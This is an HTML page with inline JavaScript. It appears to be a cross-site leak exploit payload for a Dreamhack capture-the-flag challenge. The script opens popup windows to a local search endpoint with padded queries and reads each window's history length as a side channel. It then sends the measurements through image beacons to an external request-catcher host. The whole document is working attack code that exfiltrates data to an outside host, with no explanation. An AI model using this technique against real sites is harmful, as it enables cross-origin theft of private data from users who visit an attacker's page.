<!doctype html><meta charset="utf-8"><script>
const T="http://localhost",C="https://ajvjsoq.request.dreamhack.games";
const L=(t,d)=>new Image().src=C+"/"+t+"?d="+encodeURIComponent(JSON.stringify(d))+"&t="+Date.now();
const F=(p,pad)=>`${T}/find.php?search=${encodeURIComponent(p)}&w=${"A".repeat(pad)}&h=`;
function P(u,s=1200){return new Promise(r=>{const w=open("about:blank","p","width=150,height=150");
setTimeout(()=>{try{w.location=u}catch(e){}},50);
setTimeout(()=>{let h;try{h=w.history.length}catch(e){h="ERR:"+e.name}
try{w.location="about:blank"}catch(e){}setTimeout(()=>{try{w.close()}catch(e){}},150);r(h)},s)})}
(async()=>{for(const pad of [3000,4000,5000,6000,7000]){L("calib",{pad,len:await P(F("zzz",pad))});await new Promise(r=>setTimeout(r,300))}L("done",{})})();
</script>
